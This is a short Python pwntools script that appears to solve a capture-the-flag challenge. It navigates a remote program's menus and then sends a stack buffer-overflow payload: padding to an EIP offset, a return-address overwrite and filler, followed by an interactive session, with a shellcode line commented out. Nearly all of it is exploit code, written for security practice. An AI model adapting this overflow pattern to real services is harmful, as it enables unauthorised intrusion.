#!/usr/bin/env python2

from pwn import *

r = '' # this will contain our local proces or remote socket
argError = "Specify LOCAL or REMOTE plz..."

### CHANGE THESE ###
localProcess = 'ropen_to_suggestions_noalarm'
remoteHost = 'challenge.acictf.com'
remotePort = 31803
context.update(arch='i386', os='linux')
####################

if len(sys.argv) != 2:
    print(argError)
    sys.exit(0)

if sys.argv[1] ==  "local":
    r = process(localProcess) 
elif sys.argv[1] ==  "remote":
    r = remote(remoteHost, remotePort)
else:
    print sys.argv[1]
    print argError
    sys.exit(0)

[r.recvline() for i in range(4)]
r.sendline()
[r.recvline() for i in range(3)]
r.sendline()
[r.recvline() for i in range(3)]
r.sendline("PEOPLE SOMETIMES MAKE MISTAKES")
[r.recvline() for i in range(14)]
r.sendline("3")
[r.recvline() for i in range(10)]
r.sendline("4")
[r.recvline() for i in range(13)]

payload = "D3"
payload += "A" * 118 # eip offset
payload += "\xbf\x05\x00\x00\x45\x00\x00\x00"
payload += "C" * 372 # rest of buffer
#payload += asm(shellcraft.sh())
r.sendline(payload)
r.interactive()
